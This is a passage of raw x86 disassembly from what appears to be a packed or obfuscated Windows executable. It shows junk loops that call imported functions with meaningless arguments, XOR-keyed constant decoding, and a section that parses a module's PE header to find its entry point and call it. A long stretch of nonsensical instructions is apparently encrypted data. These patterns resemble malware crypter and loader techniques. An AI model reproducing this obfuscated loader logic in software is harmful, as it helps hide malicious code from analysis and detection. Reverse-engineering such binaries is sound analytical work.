  406937:	mov    DWORD PTR [ebp+0x10],0x70019f3
  40693e:	mov    DWORD PTR ds:0x433633,edi
  406944:	mov    esi,DWORD PTR [ebp-0x4]
  406947:	mov    DWORD PTR ds:0x4336b7,0x237d
  406951:	cmp    ecx,esi
  406953:	mov    DWORD PTR ds:0x4336f7,0x9b
  40695d:	je     0x406998
  406963:	and    DWORD PTR ds:0x433617,0x274d
  40696d:	mov    esi,DWORD PTR [ebp+0xc]
  406970:	xor    ecx,eax
  406972:	sub    DWORD PTR ds:0x4336c3,0x433613
  40697c:	xor    esi,eax
  40697e:	lea    ecx,[esi+ecx*1+0x32729b]
  406985:	xor    ecx,eax
  406987:	cmp    ecx,0xf89c8521
  40698d:	jne    0x40692d
  406993:	jmp    0x4069c6
  406998:	add    ecx,0xffcd8d65
  40699e:	mov    esi,ecx
  4069a0:	xor    esi,eax
  4069a2:	add    esi,DWORD PTR [ebp+0x8]
  4069a5:	mov    DWORD PTR [ebp+0x8],esi
  4069a8:	mov    esi,DWORD PTR [ebp+0x8]
  4069ab:	xor    esi,ecx
  4069ad:	xor    esi,eax
  4069af:	mov    eax,DWORD PTR [edx+0x194]
  4069b5:	mov    ecx,DWORD PTR [eax]
  4069b7:	mov    eax,DWORD PTR [ecx+0x3c]
  4069ba:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4069be:	add    eax,ecx
  4069c0:	mov    DWORD PTR [ebp+0x8],esi
  4069c3:	mov    DWORD PTR [ebp+0x10],eax
  4069c6:	mov    eax,DWORD PTR [ebp+0x10]
  4069c9:	pop    esi
  4069ca:	test   eax,eax
  4069cc:	jmp    0x406c4a
  4069d1:	gs aaa 
  4069d3:	jns    0x406a20
  4069d5:	dec    ecx
  4069d6:	jno    0x406a4d
  4069d8:	xor    DWORD PTR [ebp-0x1e9b6e39],ecx
  4069de:	shl    DWORD PTR ss:[eax+0x66],1
  4069e2:	(bad)  
  4069e3:	jle    0x406a63
  4069e5:	fistp  QWORD PTR [esi+edi*2+0x7e]
  4069e9:	xor    bl,BYTE PTR [edi+0x6d]
  4069ec:	add    edx,DWORD PTR [eax+ecx*1]
  4069ef:	jbe    0x406a29
  4069f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4069f2:	je     0x406a5f
  4069f4:	fbstp  TBYTE PTR [edx+0x7aa68dff]
  4069fa:	test   edx,0xf93a92ae
  406a00:	popa   
  406a01:	jo     0x4069b7
  406a03:	adc    DWORD PTR [edx+edi*4],esi
  406a06:	cmp    BYTE PTR ds:[edi-0x2ebf76a4],ch
  406a0d:	inc    ebx
  406a0e:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  406a10:	sub    BYTE PTR [edi+0x4d],0xfb
  406a14:	dec    ebp
  406a15:	pushf  
  406a16:	shl    DWORD PTR [ebx+0x77],cl
  406a19:	(bad)  
  406a1b:	jae    0x406a47
  406a1d:	test   eax,0xedf36a56
  406a22:	mov    al,0x56
  406a24:	mov    ecx,0x3e90388a
  406a29:	cwde   
  406a2a:	rol    esi,1
  406a2c:	pop    edx
  406a2d:	jge    0x4069c6
  406a2f:	xchg   esi,eax
  406a30:	lock mul DWORD PTR [ebx+ebp*4+0x25]
  406a35:	pcmpeqw mm2,QWORD PTR [edx]
  406a38:	(bad)  
  406a39:	xor    esi,DWORD PTR [ecx-0x58]
  406a3c:	(bad)  
  406a3d:	xor    BYTE PTR [edx+0x3a29099e],ch
  406a43:	in     al,dx
  406a44:	or     ecx,DWORD PTR [ebx]
  406a46:	ds jns 0x406a97
  406a49:	or     DWORD PTR es:[ecx],esi
  406a4c:	mov    al,ds:0xc2cc3d5b
  406a51:	std    
  406a52:	ja     0x406a9f
  406a54:	jne    0x406a32
  406a56:	sub    DWORD PTR [esi-0x58],edx
  406a59:	sbb    DWORD PTR ds:0x7235f8cb,edx
  406a5f:	mov    WORD PTR [ebp-0x21eba963],fs
  406a65:	sub    DWORD PTR [ecx+0x54cd7da5],edi
  406a6b:	dec    DWORD PTR [edi-0xaca4895]
  406a71:	mov    esp,0xee8c3193
  406a76:	sub    eax,eax
  406a78:	retf   0x3078
  406a7b:	sub    edx,ebx
  406a7d:	pop    ecx
  406a7e:	sub    al,0xee
  406a80:	stos   BYTE PTR es:[edi],al
  406a81:	jle    0x406a72
  406a83:	inc    edx
  406a84:	leave  
  406a85:	inc    eax
  406a86:	or     edi,eax
  406a88:	lds    eax,FWORD PTR [edx-0x16]
  406a8b:	sbb    ecx,DWORD PTR [esi]
  406a8d:	jb     0x406a8c
  406a8f:	dec    BYTE PTR [edi]
  406a91:	mov    esi,0x7d491921
  406a96:	iret   
  406a97:	lods   eax,DWORD PTR ds:[esi]
  406a98:	add    eax,0xa3bc45f2
  406a9d:	int3   
  406a9e:	inc    edx
  406a9f:	out    dx,eax
  406aa0:	inc    ebx
  406aa1:	je     0x406a23
  406aa3:	sbb    eax,0x732e14da
  406aa8:	mov    ds:0x902f6160,eax
  406aad:	loopne 0x406ae7
  406aaf:	popf   
  406ab0:	mov    al,ds:0xd6154ac3
  406ab5:	push   edi
  406ab6:	jmp    0xb635:0x450d592f
  406abd:	call   0x7239788
  406ac2:	shr    dl,cl
  406ac4:	popa   
  406ac5:	call   0xc36c1d89
  406aca:	jnp    0x406b00
  406acc:	pop    edi
  406acd:	les    eax,FWORD PTR [edx]
  406acf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ad0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ad1:	lds    esi,FWORD PTR [eax+eiz*2]
  406ad4:	and    BYTE PTR [esi+0x5e269612],ch
  406ada:	rcr    BYTE PTR [ebx-0x381aecc0],0x30
  406ae1:	mov    ds:0x3f35cfa5,al
  406ae6:	aaa    
  406ae7:	(bad)  
  406ae9:	jl     0x406b02
  406aeb:	mov    esp,0x1e9d79e4
  406af0:	(bad)  
  406af1:	cmp    eax,0xa47f6716
  406af6:	adc    al,0x92
  406af8:	mov    ebx,0x862e7536
  406afd:	xchg   esi,eax
  406afe:	call   0xd178377d
  406b03:	pop    eax
  406b04:	add    eax,0xab272c3a
  406b09:	add    bl,dh
  406b0b:	pusha  
  406b0c:	and    bl,BYTE PTR [edi+0x26b1e74]
  406b12:	jae    0x406ad7
  406b14:	push   es
  406b15:	popf   
  406b16:	into   
  406b17:	out    dx,eax
  406b18:	mov    esp,0xa19c023d
  406b1d:	fdiv   DWORD PTR [esi-0x29eb491]
  406b23:	lods   al,BYTE PTR ds:[esi]
  406b24:	into   
  406b25:	out    0x14,eax
  406b27:	add    ch,BYTE PTR [ebp-0x35]
  406b2a:	mov    dl,bl
  406b2c:	hlt    
  406b2d:	lahf   
  406b2e:	call   0xd9d3e043
  406b33:	loop   0x406b20
  406b35:	(bad)
  406b39:	inc    edi
  406b3a:	les    eax,FWORD PTR [ecx-0x7e]
  406b3d:	je     0x406ac8
  406b3f:	mov    al,0x87
  406b41:	lock ret 0x869a
  406b45:	imul   edx,DWORD PTR [esi],0x15c366ef
  406b4b:	sub    ch,al
  406b4d:	icebp  
  406b4e:	sub    eax,DWORD PTR [edi]
  406b50:	add    ch,BYTE PTR [edi+0x2c]
  406b53:	cmp    ch,ah
  406b55:	mov    ds:0x3159abf8,eax
  406b5a:	(bad)  
  406b5b:	fld    DWORD PTR [esi-0x20]
  406b5e:	push   es
  406b5f:	test   esi,ebx
  406b61:	addr16 pop ecx
  406b63:	jmp    0x618c:0x1446d1bc
  406b6a:	pop    ebx
  406b6b:	retf   0x992d
  406b6e:	or     al,0x1e
  406b70:	inc    esi
  406b71:	cmp    DWORD PTR [esi+0x2ebfa37a],ecx
  406b77:	into   
  406b78:	enter  0xffc2,0x95
  406b7c:	inc    eax
  406b7d:	bts    DWORD PTR [edx+ebx*8],esp
  406b81:	cmp    al,0x16
  406b83:	aaa    
  406b84:	lahf   
  406b85:	(bad)  
  406b87:	add    al,0x86
  406b89:	stos   BYTE PTR es:[edi],al
  406b8a:	pop    eax
  406b8b:	imul   ebx,DWORD PTR [ebx+0x4c50a149],0x3f
  406b92:	daa    
  406b93:	pop    edx
  406b94:	loop   0x406bb7
  406b96:	mov    esp,0x5c31491f
  406b9b:	push   es
  406b9c:	sub    esp,DWORD PTR [ebp-0x1e37b3b6]
  406ba2:	mov    dh,0x60
  406ba4:	or     al,0x6e
  406ba6:	jg     0x406b4a
  406ba8:	arpl   WORD PTR [edx-0x6e],di
  406bab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406bac:	cmp    BYTE PTR [ebx],0x3a
  406baf:	xchg   ecx,eax
  406bb0:	stc    
  406bb1:	cmp    eax,0xb714715b
  406bb6:	cli    
  406bb7:	add    ch,BYTE PTR [ebp-0x37]
  406bba:	pop    es
  406bbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406bbc:	jne    0x406bc7
  406bbe:	xor    eax,0x7ecf65ec
  406bc3:	sti    
  406bc4:	sahf   
  406bc5:	sub    DWORD PTR [ecx+0x5c],0x31
  406bc9:	iret   
  406bca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406bcb:	cmp    dl,bl
  406bcd:	mov    ch,0xda
  406bcf:	inc    edi
  406bd0:	rcr    BYTE PTR [ecx+0x366e5251],1
  406bd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406bd7:	sar    DWORD PTR [esi+0x442eec21],1
  406bdd:	add    BYTE PTR [ecx],0x8b
  406be0:	test   BYTE PTR [edx],al
  406be2:	iret   
  406be3:	or     ebp,DWORD PTR [ebx+0x48]
  406be6:	call   0x5608:0x6f314ea2
  406bed:	mov    ebx,0xdf2d5028
  406bf2:	jnp    0x406c2f
  406bf4:	jecxz  0x406ba7
  406bf6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406bf7:	rcl    DWORD PTR [esp+edi*8],1
  406bfa:	sbb    DWORD PTR [ebx],0xffffffdb
  406bfd:	imul   esi,DWORD PTR [edi+0x3a],0xffffffe0
  406c01:	jbe    0x406c79
  406c03:	icebp  
  406c04:	sub    ebp,ebp
  406c06:	call   0xa769:0x82140abc
  406c0d:	or     al,0x18
  406c0f:	lods   al,BYTE PTR ds:[esi]
  406c10:	adc    al,0x5b
  406c12:	test   al,0x39
  406c14:	pop    esp
  406c15:	jp     0x406c96
  406c17:	xor    ch,BYTE PTR [ebx]
  406c19:	jae    0x406bc7
  406c1b:	jo     0x406c10
  406c1d:	pop    ebp
  406c1e:	aas    
  406c1f:	push   esi
  406c20:	mov    ecx,0x6e4844c2
  406c25:	pop    edi
  406c26:	pop    eax
  406c27:	jne    0x406c8e
  406c29:	mov    ah,0xe8
  406c2b:	int3   
  406c2c:	and    ebp,DWORD PTR [ebx]
  406c2e:	stos   DWORD PTR es:[edi],eax
  406c2f:	add    eax,DWORD PTR [ebp+0x5360dd16]
  406c35:	jno    0x406c61
  406c37:	push   0x5d
  406c39:	(bad)  
  406c3a:	fnstsw WORD PTR [ebx+0x26]
  406c3d:	test   DWORD PTR [edi+0x82f3007],0x9fc935c7
  406c47:	or     eax,0x840f00b1
  406c4c:	pushf  
  406c4d:	add    al,BYTE PTR [eax]
  406c4f:	add    bh,bh
  406c51:	xor    eax,0x413cb6
  406c56:	push   DWORD PTR ds:0x413a62
  406c5c:	mov    eax,DWORD PTR [edx+0x194]
  406c62:	push   DWORD PTR [eax]
  406c64:	mov    eax,DWORD PTR [ebp+0x10]
  406c67:	call   eax
  406c69:	jmp    0x406eef
  406c6e:	jmp    0x406eec
  406c73:	push   ebx
  406c74:	jo     0x406c41
  406c76:	es jmp 0xfbb1e021
  406c7c:	mov    edi,0xae272bde
  406c81:	jne    0x406c31
  406c83:	mov    edx,0x7cdf7e7e
  406c89:	jle    0x406d09
  406c8b:	out    0x65,al
  406c8d:	bound  ecx,QWORD PTR [ecx]
  406c8f:	xchg   ecx,eax
  406c90:	sub    BYTE PTR [edi+0x11],ch
  406c93:	jmp    DWORD PTR [eax-0x74692583]
  406c99:	daa    
  406c9a:	retf   
  406c9b:	xlat   BYTE PTR ds:[ebx]
  406c9c:	xchg   edx,eax
  406c9d:	cs dec esp
  406c9f:	inc    ebx
  406ca0:	dec    edi
  406ca1:	loope  0x406d16
  406ca3:	add    eax,0x91b4365f
  406ca8:	lock jmp 0x4681:0xf9d5bb20
  406cb0:	adc    edx,ecx
  406cb2:	mov    bh,0x7f
  406cb4:	aam    0x40
  406cb6:	dec    ecx
  406cb7:	sahf   
  406cb8:	test   al,0x6d
  406cba:	sbb    bl,bh
  406cbc:	rcr    BYTE PTR [ebp+0x55ffaec8],1
  406cc2:	push   es
  406cc3:	popf   
  406cc4:	lea    edx,[ebx+0x66c6219a]
  406cca:	jl     0x406c72
  406ccc:	and    cl,BYTE PTR [ebp+0x1d]
  406ccf:	xchg   edi,eax
  406cd0:	test   BYTE PTR [edx+0x5],dh
  406cd3:	add    eax,0x8c57e1a
  406cd8:	lods   eax,DWORD PTR ds:[esi]
  406cd9:	or     BYTE PTR [ebx+0x62],0xc9
  406cdd:	loope  0x406d2f
  406cdf:	loopne 0x406cf0
  406ce1:	xor    eax,0x5c8eb747
  406ce6:	push   eax
  406ce7:	xor    al,0x52
  406ce9:	popf   
  406cea:	mov    esi,0xa37be272
  406cef:	fimul  DWORD PTR [edx]
  406cf1:	int3   
  406cf2:	icebp  
  406cf3:	test   DWORD PTR [edi+0x4b],eax
  406cf6:	jb     0x406d17
  406cf8:	jecxz  0x406ca5
  406cfa:	ins    DWORD PTR es:[edi],dx
  406cfb:	inc    esi
  406cfc:	xor    eax,0x7ef90a03
  406d01:	and    eax,DWORD PTR fs:[ebp+0xd]
  406d05:	(bad)  
  406d07:	xor    dh,BYTE PTR [esi-0x6205b249]
  406d0d:	loope  0x406ca7
  406d0f:	sub    ch,BYTE PTR [edi+0x5686919]
  406d15:	mov    ah,ah
  406d17:	mov    ch,0xec
  406d19:	or     bh,bl
  406d1b:	loopne 0x406d37
  406d1d:	in     al,0xdf
  406d1f:	pop    esp
  406d20:	add    cl,BYTE PTR [ebx+0x2d319349]
  406d26:	retf   0x39a8
  406d29:	in     al,0x7b
  406d2b:	fdiv   DWORD PTR [edi]
  406d2d:	aaa    
  406d2e:	mov    ebp,0xc959b6e3
  406d33:	adc    al,0xa1
  406d35:	enter  0xb52b,0x2
  406d39:	out    dx,al
  406d3a:	loopne 0x406d38
  406d3c:	scas   al,BYTE PTR es:[edi]
  406d3d:	dec    edx
  406d3e:	xor    BYTE PTR [esi],ch
  406d40:	sahf   
  406d41:	xor    BYTE PTR [ebp-0x615c9517],0xa3
  406d48:	or     eax,edx
  406d4a:	mov    BYTE PTR [eax+0x49575f63],dl
  406d50:	in     al,0x41
  406d52:	push   es
  406d53:	dec    ebx
  406d54:	pop    eax
  406d55:	in     eax,0xac
  406d57:	mov    ch,0x6d
  406d59:	fimul  DWORD PTR [eax+0x5ded5984]
  406d5f:	es cmp eax,0x107b0a02
  406d65:	cwde   
  406d66:	cmp    edx,DWORD PTR [ebx]
  406d68:	sub    DWORD PTR [edi-0x33e64c98],edi
  406d6e:	sti    
  406d6f:	in     al,dx
  406d70:	or     esp,ecx
  406d72:	push   0xa801c4af
  406d77:	sub    BYTE PTR [eax],ah
  406d79:	fisttp WORD PTR [ebx+0x5932f7c6]
  406d7f:	adc    DWORD PTR [eax-0x23],ecx
  406d82:	lahf   
  406d83:	(bad)  
  406d84:	ins    BYTE PTR es:[edi],dx
  406d85:	xchg   ebp,eax
  406d86:	lea    ecx,[ebp-0x197cbe15]
  406d8c:	mov    DWORD PTR ss:[edi],ebp
  406d8f:	popa   
  406d90:	add    dl,BYTE PTR [edx+eiz*4+0x1fa12fd9]
  406d97:	xor    DWORD PTR ds:0x69922715,0xffffffcf
  406d9e:	mov    ss,WORD PTR [ebp-0x77]
  406da1:	xlat   BYTE PTR ds:[ebx]
  406da2:	inc    ecx
  406da3:	ss dec esp
  406da5:	sahf   
  406da6:	sti    
  406da7:	stc    
  406da8:	std    
  406da9:	adc    DWORD PTR [ebx-0x4a],esp
  406dac:	sub    eax,0xd6a0ddc0
  406db1:	cmp    dl,BYTE PTR [edi-0x4f]
  406db4:	pop    eax
  406db5:	jp     0x406da8
  406db7:	stos   DWORD PTR es:[edi],eax
  406db8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406db9:	in     eax,0x66
  406dbb:	gs sbb eax,0x2b6bd6ed
  406dc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406dc2:	dec    edx
  406dc3:	push   edx
  406dc4:	dec    edx
  406dc5:	es cld 
  406dc7:	and    DWORD PTR [edx+ebx*8],esp
  406dca:	mov    WORD PTR [ecx+0x4f863545],ds
  406dd0:	and    ebx,DWORD PTR [esi+0x74]
  406dd3:	mov    dh,BYTE PTR [eax+esi*4-0x5]
  406dd7:	test   BYTE PTR [ecx+0x13f62bc9],0x40
  406dde:	mov    al,ds:0x389faffc
  406de3:	or     esp,DWORD PTR [ebx]
  406de5:	mov    esi,0x1a2dade
  406dea:	pop    ds
  406deb:	test   BYTE PTR ds:0xbbb874d8,ch
  406df1:	repz push 0xf4e4791a
  406df7:	add    DWORD PTR [edx],esp
  406df9:	enter  0x9804,0x52
  406dfd:	(bad)  
  406dfe:	rcr    BYTE PTR [edx],1
  406e00:	sbb    al,al
  406e02:	xchg   DWORD PTR [ebx-0x1a],edi
  406e05:	mov    ds:0x6bdc594f,al
  406e0a:	dec    edx
  406e0b:	jmp    0x406e1f
  406e0d:	jl     0x406dc4
  406e0f:	mov    ebp,0x2d38c2ce
  406e14:	pop    edi
  406e15:	pop    ecx
  406e16:	test   DWORD PTR [ebx-0x7c9f14b3],0xbaf1debc
  406e20:	lods   al,BYTE PTR ds:[esi]
  406e21:	dec    edx
  406e22:	out    0xfe,eax
  406e24:	jecxz  0x406dd3
  406e26:	mov    esi,0xb9bbdea
  406e2b:	sub    edx,DWORD PTR [ecx+0x2d]
  406e2e:	shl    DWORD PTR [edx+0x50],0xe8
  406e32:	outs   dx,BYTE PTR ds:[esi]
  406e33:	int    0x58
  406e35:	dec    ebx
  406e36:	sbb    DWORD PTR [ecx],eax
  406e38:	xchg   esi,eax
  406e39:	add    eax,0x9441e8f9
  406e3e:	cmp    eax,0x8f5ed4cb
  406e43:	push   ss
  406e44:	push   edx
  406e45:	(bad)  
  406e46:	jmp    0x12ea:0xdca3240a
  406e4d:	push   ebp
  406e4e:	cmp    al,0x10
  406e50:	adc    esp,DWORD PTR [eax-0x73b18a6d]
  406e56:	push   DWORD PTR [eax+ebp*4+0x1d41e01e]
  406e5d:	mov    ebp,0xf273fc74
  406e62:	add    eax,0x7e31caec
  406e67:	jecxz  0x406e92
  406e69:	adc    DWORD PTR [ebp+0x57],ebx
  406e6c:	xchg   BYTE PTR [ebp-0xd],bl
  406e6f:	inc    ecx
  406e70:	cmp    al,0xab
  406e72:	xchg   esi,eax
  406e73:	pop    es
  406e74:	mov    es,WORD PTR [ecx-0x58]
  406e77:	mov    ds,WORD PTR [eax]
  406e79:	clc    
  406e7a:	or     al,0x50
  406e7c:	test   ah,ah
  406e7e:	lods   eax,DWORD PTR ds:[esi]
  406e7f:	mov    bh,0xe
  406e81:	jecxz  0x406e14
  406e83:	pop    esp
  406e84:	test   BYTE PTR [edi-0x46],0x38
  406e88:	rcr    ecx,0xf2
  406e8b:	pop    edi
  406e8c:	mov    ecx,0x9d5be6fe
  406e91:	adc    al,0xfd
  406e93:	test   ecx,0x46f191c2
  406e99:	xchg   ebp,eax
  406e9a:	cld    
  406e9b:	stos   BYTE PTR es:[edi],al
  406e9c:	pmuludq mm5,QWORD PTR [ebp+0x473ae39f]
  406ea3:	push   esi
  406ea4:	pop    ebx
  406ea5:	cmp    eax,0x17b5ad6f
  406eaa:	pop    esi
  406eab:	int    0x34
  406ead:	jns    0x406f2a
  406eaf:	xor    eax,0xdff7fdec
  406eb4:	aas    
  406eb5:	stos   DWORD PTR es:[edi],eax
  406eb6:	xchg   esp,eax
  406eb7:	cmp    cl,bh
  406eb9:	cwde   
  406eba:	pop    ebp
  406ebb:	fdiv   QWORD PTR [edi-0x28]
  406ebe:	mov    bh,0x37
  406ec0:	inc    esi
  406ec1:	adc    esi,DWORD PTR es:[ebx]
  406ec4:	outs   dx,BYTE PTR ds:[esi]
  406ec5:	adc    al,0x64
  406ec7:	and    ch,bh
  406ec9:	js     0x406e4c
  406ecb:	ficom  WORD PTR [ebx]
  406ecd:	mov    ah,0x2e
  406ecf:	adc    DWORD PTR [ebp+0x23d4b7a6],esp
  406ed5:	cmp    DWORD PTR [ecx+0x5dc37b74],0xffffffea
  406edc:	mov    dh,0xcb
  406ede:	dec    esi
  406edf:	or     bh,dh
  406ee1:	pushf  
  406ee2:	sub    ebx,ebp
  406ee4:	dec    eax
  406ee5:	es in  al,0x4c
  406ee8:	cmp    esp,esp
  406eea:	push   esp
  406eeb:	mov    dh,0x8b
  406eed:	inc    ebp
  406eee:	adc    cl,cl
  406ef0:	ret    0xc
  406ef3:	push   ebp
  406ef4:	mov    ebp,esp
  406ef6:	sub    esp,0x28
  406ef9:	mov    DWORD PTR ds:0x43366f,0x71e2
  406f03:	push   0x413d5e
  406f08:	call   DWORD PTR ds:0x412420
  406f0e:	cmp    BYTE PTR [eax],0x0
  406f11:	mov    DWORD PTR ds:0x433623,0xa08
  406f1b:	je     0x406f32
  406f21:	and    DWORD PTR ds:0x43372f,0x433613
  406f2b:	xor    eax,eax
  406f2d:	jmp    0x407466
  406f32:	push   0x413da6
  406f37:	add    DWORD PTR ds:0x43372f,0x4336a7
  406f41:	call   DWORD PTR ds:0x4121d4
  406f47:	mov    DWORD PTR ds:0x4336eb,0x6fd9
  406f51:	cmp    eax,0xa
  406f54:	mov    DWORD PTR ds:0x4336bb,0x485d
  406f5e:	jl     0x406f21
  406f64:	add    ecx,DWORD PTR ds:0x433727
  406f6a:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  406f71:	mov    DWORD PTR ds:0x4336fb,0x11
  406f7b:	cmp    DWORD PTR ds:0x4336fb,0x0
  406f82:	je     0x406fdd
  406f88:	cmp    DWORD PTR ds:0x4336fb,0x5
  406f8f:	jne    0x406fa5
  406f95:	push   0x7487
  406f9a:	push   0x433767
  406f9f:	call   DWORD PTR ds:0x4121c0
  406fa5:	cmp    DWORD PTR ds:0x4336fb,0x6
  406fac:	jne    0x406fbf
  406fb2:	mov    ecx,DWORD PTR ds:0x4336fb
  406fb8:	dec    ecx
  406fb9:	mov    DWORD PTR ds:0x4336fb,ecx
  406fbf:	xor    ecx,ecx
  406fc1:	add    ecx,DWORD PTR ds:0x4336fb
  406fc7:	dec    ecx
  406fc8:	mov    DWORD PTR ds:0x4336fb,ecx
  406fce:	jmp    0x406f7b
  406fd3:	adc    DWORD PTR ds:0x43362b,0x7658
  406fdd:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  406fe4:	mov    DWORD PTR ds:0x433673,0x15
  406fee:	cmp    DWORD PTR ds:0x433673,0x0
  406ff5:	je     0x407051
  406ffb:	cmp    DWORD PTR ds:0x433673,0x2
  407002:	jne    0x40701d
  407008:	push   0x43367b
  40700d:	push   0x433703
  407012:	push   0x3143
  407017:	call   DWORD PTR ds:0x412360
  40701d:	cmp    DWORD PTR ds:0x433673,0x3
  407024:	jne    0x407039
  40702a:	xor    ecx,ecx
  40702c:	or     ecx,DWORD PTR ds:0x433673
  407032:	dec    ecx
  407033:	mov    DWORD PTR ds:0x433673,ecx
  407039:	mov    ecx,DWORD PTR ds:0x433673
  40703f:	dec    ecx
  407040:	mov    DWORD PTR ds:0x433673,ecx
  407046:	jmp    0x406fee
  40704b:	sbb    ecx,DWORD PTR ds:0x4336ff
  407051:	lea    eax,[ebp-0x20]
  407054:	mov    DWORD PTR ds:0x43362f,0x1c
  40705e:	cmp    DWORD PTR ds:0x43362f,0x0
  407065:	je     0x4070a1
  40706b:	cmp    DWORD PTR ds:0x43362f,0x2b
  407072:	jne    0x407089
  407078:	push   DWORD PTR [ebp-0xc]
  40707b:	push   0x43362f
  407080:	push   DWORD PTR [ebp-0x24]
  407083:	call   DWORD PTR ds:0x4121c4
  407089:	mov    ecx,DWORD PTR ds:0x43362f
  40708f:	dec    ecx
  407090:	mov    DWORD PTR ds:0x43362f,ecx
  407096:	jmp    0x40705e
  40709b:	xor    ecx,0x624a
  4070a1:	mov    DWORD PTR [ebp-0x14],eax
  4070a4:	lea    eax,[ebp-0x1c]
  4070a7:	mov    DWORD PTR [ebp-0x10],eax
  4070aa:	adc    ecx,eax
  4070ac:	mov    eax,ds:0x413bde
  4070b1:	mov    ecx,DWORD PTR ds:0x433647
  4070b7:	mov    ecx,DWORD PTR [ecx]
  4070b9:	xor    DWORD PTR ds:0x4336b3,ecx
  4070bf:	mov    eax,DWORD PTR [eax+0x1c8]
  4070c5:	or     DWORD PTR ds:0x433633,0x1d95
  4070cf:	mov    eax,DWORD PTR [eax]
  4070d1:	sub    ecx,0x7a4e
  4070d7:	mov    ecx,DWORD PTR [ebp-0x10]
  4070da:	add    DWORD PTR ds:0x43366f,0x433627
  4070e4:	push   ebx
  4070e5:	push   esi
  4070e6:	sub    DWORD PTR ds:0x43361f,ebx
  4070ec:	mov    esi,0x7510854
  4070f1:	and    DWORD PTR ds:0x4336a7,0x0
  4070fb:	mov    ebx,DWORD PTR ds:0x4336a7
  407101:	inc    ebx
  407102:	mov    DWORD PTR ds:0x4336a7,ebx
  407108:	cmp    DWORD PTR ds:0x4336a7,0x7
  40710f:	jne    0x407128
  407115:	push   DWORD PTR [ebp-0x1c]
  407118:	push   0x8eb0
  40711d:	push   0x3be9
  407122:	call   DWORD PTR ds:0x4121c8
  407128:	cmp    DWORD PTR ds:0x4336a7,0x6
  40712f:	jne    0x407144
  407135:	xor    ebx,ebx
  407137:	xor    ebx,DWORD PTR ds:0x4336a7
  40713d:	inc    ebx
  40713e:	mov    DWORD PTR ds:0x4336a7,ebx
  407144:	cmp    DWORD PTR ds:0x4336a7,0x15
  40714b:	jb     0x4070fb
  407151:	and    DWORD PTR ds:0x4336eb,edi
  407157:	xor    eax,esi
  407159:	sub    ebx,DWORD PTR ds:0x43361b
  40715f:	push   edi
  407160:	xor    ebx,0x561f
  407166:	mov    edi,0x32729b
  40716b:	mov    DWORD PTR ds:0x433743,0x1c
  407175:	cmp    DWORD PTR ds:0x433743,0x0
  40717c:	je     0x407271
  407182:	cmp    DWORD PTR ds:0x433743,0x25
  407189:	jne    0x40719d
  40718f:	push   0x43379a
  407194:	push   DWORD PTR [ebp-0x20]
  407197:	call   DWORD PTR ds:0x412008
  40719d:	mov    ebx,DWORD PTR ds:0x433743
  4071a3:	dec    ebx
  4071a4:	mov    DWORD PTR ds:0x433743,ebx
  4071aa:	jmp    0x407175
  4071af:	and    DWORD PTR ds:0x43361f,0x0
  4071b9:	jmp    0x4071cb
  4071be:	mov    ebx,DWORD PTR ds:0x43361f
  4071c4:	inc    ebx
  4071c5:	mov    DWORD PTR ds:0x43361f,ebx
  4071cb:	cmp    DWORD PTR ds:0x43361f,0x1a
  4071d2:	jae    0x407271
  4071d8:	cmp    DWORD PTR ds:0x43361f,0x8
  4071df:	jne    0x4071f0
  4071e5:	push   0x2cbb
  4071ea:	call   DWORD PTR ds:0x41200c
  4071f0:	cmp    DWORD PTR ds:0x43361f,0x7
  4071f7:	jne    0x40720a
  4071fd:	mov    ebx,DWORD PTR ds:0x43361f
  407203:	inc    ebx
  407204:	mov    DWORD PTR ds:0x43361f,ebx
  40720a:	jmp    0x4071be
  40720f:	and    DWORD PTR ds:0x433683,0x0
  407219:	mov    ebx,DWORD PTR ds:0x433683
  40721f:	inc    ebx
  407220:	mov    DWORD PTR ds:0x433683,ebx
  407226:	cmp    DWORD PTR ds:0x433683,0x4
  40722d:	jne    0x407244
  407233:	push   DWORD PTR [ebp-0x10]
  407236:	push   0x347b
  40723b:	push   DWORD PTR [ebp-0xc]
  40723e:	call   DWORD PTR ds:0x412364
  407244:	cmp    DWORD PTR ds:0x433683,0x3
  40724b:	jne    0x40725e
  407251:	mov    ebx,DWORD PTR ds:0x433683
  407257:	inc    ebx
  407258:	mov    DWORD PTR ds:0x433683,ebx
  40725e:	cmp    DWORD PTR ds:0x433683,0x11
  407265:	jb     0x407219
  40726b:	adc    DWORD PTR ds:0x43362f,ebx
  407271:	add    eax,edi
  407273:	mov    DWORD PTR ds:0x43361f,0x2325
  40727d:	mov    DWORD PTR [ecx],eax
  40727f:	mov    DWORD PTR ds:0x4336f7,0x6c11
  407289:	mov    eax,ds:0x413e96
  40728e:	mov    ebx,0x7633
  407293:	cmp    eax,0x23c13046
  407298:	mov    eax,DWORD PTR [ebp-0x4]
  40729b:	mov    ebx,0xf89c853d
  4072a0:	je     0x4072b8
  4072a6:	mov    ecx,DWORD PTR [ebp-0x8]
  4072a9:	xor    eax,esi
  4072ab:	add    eax,edi
  4072ad:	imul   eax,ecx
  4072b0:	mov    DWORD PTR [ebp-0x8],eax
  4072b3:	jmp    0x4072ef
  4072b8:	xor    eax,esi
  4072ba:	add    eax,edi
  4072bc:	mov    ds:0x413cf2,eax
  4072c1:	mov    eax,DWORD PTR [ebp-0x8]
  4072c4:	xor    eax,esi
  4072c6:	add    eax,edi
  4072c8:	mov    ds:0x413e96,eax
  4072cd:	mov    eax,DWORD PTR [ebp-0x4]
  4072d0:	mov    ecx,DWORD PTR ds:0x413cf2
  4072d6:	xor    eax,esi
  4072d8:	add    eax,edi
  4072da:	cmp    ecx,eax
  4072dc:	jne    0x4072ef
  4072e2:	push   ebx
  4072e3:	push   DWORD PTR [ebp-0x4]
  4072e6:	push   DWORD PTR [ebp-0x8]
